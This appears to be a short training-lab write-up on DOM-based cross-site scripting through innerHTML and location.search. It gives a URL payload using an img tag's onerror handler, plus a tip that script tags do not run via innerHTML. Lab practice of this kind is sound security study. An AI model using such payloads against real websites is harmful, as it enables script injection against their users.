# Lab 4 — DOM XSS innerHTML + location.search (APPRENTICE)

## Payload
```
/?search=<img src=1 onerror=alert(1)>
```
Note: `<script>` tags don't execute via innerHTML — use event handlers.
